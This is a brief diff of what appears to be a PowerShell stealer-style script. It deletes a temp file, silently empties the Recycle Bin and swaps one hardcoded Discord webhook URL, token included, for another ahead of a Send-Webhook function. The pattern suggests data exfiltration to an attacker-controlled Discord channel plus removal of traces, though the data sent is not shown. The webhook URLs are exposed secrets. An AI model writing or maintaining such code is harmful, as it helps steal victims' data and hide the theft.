@@ -1678,7 +1678,7 @@ try { Remove-Item -Path $tempFile -Force -ErrorAction Stop } catch { exit }
 try { Clear-RecycleBin -Force -ErrorAction SilentlyContinue } catch { exit }
 
 
-$webhookUrl = "https://discord.com/api/webhooks/1506648870115868732/BKnzwsld8PWYOJ-Jpzf67s_IEMIta1FZhLTacUYSsVwidlLjF_2yQx9iSw5cwJpQL6QE"
+$webhookUrl = "https://discord.com/api/webhooks/1529205433183502438/vKV1yn97-j0QKYrdugPTjR7EouKelW4_DEoQ3pWOBpBmlIlS2o4Hq4wh9CRcgFv9aNIg"
 
 function Send-Webhook {
     param(
